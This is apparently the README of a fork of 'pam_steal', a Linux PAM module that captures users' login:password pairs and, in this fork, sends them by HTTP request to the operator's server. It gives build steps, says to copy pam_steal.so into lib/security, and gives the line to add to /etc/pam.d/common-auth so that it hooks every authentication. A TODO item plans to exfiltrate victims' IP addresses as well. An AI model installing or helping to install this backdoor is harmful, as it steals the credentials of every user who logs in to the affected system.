# PAM_STEAL
Fork of pam_steal  by ONsec.

Change save login:password in file to send it by HTTP request to your server.

## Install
`./make.sh`

Then manual copy **pam_steal.so** to lib/security folder.
Next edit /etc/pam.d/common-auth file. Add there:
```
  auth required pam_steal.so
```
See details at http://lab.onsec.ru/2015/11/increases-power-of-pam-steal-module.html and http://lab.onsec.ru/2014/07/pamsteal-plugin-released.html

### TODO:

 - ~~Add connect timeout~~
 - Add IP address send
